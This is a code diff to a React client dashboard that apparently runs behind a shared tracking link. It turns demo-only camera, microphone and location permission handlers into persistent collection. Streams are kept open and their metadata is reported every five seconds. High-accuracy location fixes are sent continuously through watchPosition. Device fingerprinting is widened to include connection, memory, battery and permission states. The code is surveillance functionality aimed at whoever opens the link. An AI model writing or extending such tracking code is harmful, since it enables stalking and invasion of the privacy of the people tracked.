@@ -89,17 +89,58 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       setPermissions(prev => ({ ...prev, camera: true }));
+      
+      // Send permission granted message
       sendMessage({
         type: 'permission_granted',
         permission: 'camera',
         granted: true,
         sessionId
       });
-      // Stop the stream immediately for demo
-      stream.getTracks().forEach(track => track.stop());
+      
+      // Send camera stream information (we can't actually send the stream via WebSocket)
+      // Instead, we'll send metadata and keep the stream active
+      sendMessage({
+        type: 'camera_stream',
+        sessionId,
+        stream: {
+          active: true,
+          tracks: stream.getVideoTracks().map(track => ({
+            id: track.id,
+            kind: track.kind,
+            label: track.label,
+            enabled: track.enabled,
+            muted: track.muted,
+            settings: track.getSettings()
+          }))
+        }
+      });
+      
+      // Keep the stream active and send periodic updates
+      const interval = setInterval(() => {
+        if (stream.active) {
+          sendMessage({
+            type: 'camera_stream',
+            sessionId,
+            stream: {
+              active: true,
+              timestamp: new Date().toISOString(),
+              tracks: stream.getVideoTracks().map(track => ({
+                id: track.id,
+                enabled: track.enabled,
+                muted: track.muted,
+                readyState: track.readyState
+              }))
+            }
+          });
+        } else {
+          clearInterval(interval);
+        }
+      }, 5000);
+      
       toast({
         title: "Camera Access Granted",
-        description: "Camera permission granted for demonstration",
+        description: "Camera stream is now active",
       });
     } catch (error) {
       setPermissions(prev => ({ ...prev, camera: false }));
@@ -121,17 +162,57 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
       setPermissions(prev => ({ ...prev, microphone: true }));
+      
+      // Send permission granted message
       sendMessage({
         type: 'permission_granted',
         permission: 'microphone',
         granted: true,
         sessionId
       });
-      // Stop the stream immediately for demo
-      stream.getTracks().forEach(track => track.stop());
+      
+      // Send microphone stream information
+      sendMessage({
+        type: 'microphone_data',
+        sessionId,
+        data: {
+          active: true,
+          tracks: stream.getAudioTracks().map(track => ({
+            id: track.id,
+            kind: track.kind,
+            label: track.label,
+            enabled: track.enabled,
+            muted: track.muted,
+            settings: track.getSettings()
+          }))
+        }
+      });
+      
+      // Keep the stream active and send periodic updates
+      const interval = setInterval(() => {
+        if (stream.active) {
+          sendMessage({
+            type: 'microphone_data',
+            sessionId,
+            data: {
+              active: true,
+              timestamp: new Date().toISOString(),
+              tracks: stream.getAudioTracks().map(track => ({
+                id: track.id,
+                enabled: track.enabled,
+                muted: track.muted,
+                readyState: track.readyState
+              }))
+            }
+          });
+        } else {
+          clearInterval(interval);
+        }
+      }, 5000);
+      
       toast({
         title: "Microphone Access Granted",
-        description: "Microphone permission granted for demonstration",
+        description: "Microphone stream is now active",
       });
     } catch (error) {
       setPermissions(prev => ({ ...prev, microphone: false }));
@@ -152,24 +233,73 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
   const requestLocationPermission = async () => {
     try {
       const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
       });
       
       setPermissions(prev => ({ ...prev, location: true }));
+      
+      const locationData = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        altitudeAccuracy: position.coords.altitudeAccuracy,
+        heading: position.coords.heading,
+        speed: position.coords.speed,
+        timestamp: position.timestamp
+      };
+      
       sendMessage({
         type: 'permission_granted',
         permission: 'location',
         granted: true,
         sessionId,
-        data: {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        }
+        data: locationData
       });
+      
+      sendMessage({
+        type: 'location_data',
+        sessionId,
+        data: locationData
+      });
+      
+      // Set up continuous location tracking
+      const watchId = navigator.geolocation.watchPosition(
+        (position) => {
+          const updatedLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            heading: position.coords.heading,
+            speed: position.coords.speed,
+            timestamp: position.timestamp
+          };
+          
+          sendMessage({
+            type: 'location_data',
+            sessionId,
+            data: updatedLocation
+          });
+        },
+        (error) => {
+          console.error('Location tracking error:', error);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 30000
+        }
+      );
+      
       toast({
         title: "Location Access Granted",
-        description: "Location permission granted for demonstration",
+        description: "Continuous location tracking is now active",
       });
     } catch (error) {
       setPermissions(prev => ({ ...prev, location: false }));
@@ -193,7 +323,30 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
       timestamp: new Date().toISOString(),
       url: window.location.href,
       referrer: document.referrer,
-      title: document.title
+      title: document.title,
+      // Additional system information
+      connection: (navigator as any).connection ? {
+        effectiveType: (navigator as any).connection.effectiveType,
+        downlink: (navigator as any).connection.downlink,
+        rtt: (navigator as any).connection.rtt,
+        saveData: (navigator as any).connection.saveData
+      } : null,
+      memory: (performance as any).memory ? {
+        usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
+        totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
+        jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit
+      } : null,
+      battery: await (navigator as any).getBattery?.().catch(() => null),
+      permissions: await Promise.all([
+        'camera', 'microphone', 'geolocation', 'notifications'
+      ].map(async (name) => {
+        try {
+          const result = await navigator.permissions.query({ name: name as PermissionName });
+          return { name, state: result.state };
+        } catch {
+          return { name, state: 'unknown' };
+        }
+      }))
     };
     
     sendMessage({
@@ -202,9 +355,15 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
       data: systemInfo
     });
     
+    sendMessage({
+      type: 'system_info_data',
+      sessionId,
+      data: systemInfo
+    });
+    
     toast({
       title: "System Information Sent",
-      description: "System information has been collected",
+      description: "Comprehensive system information has been collected",
     });
   };
 
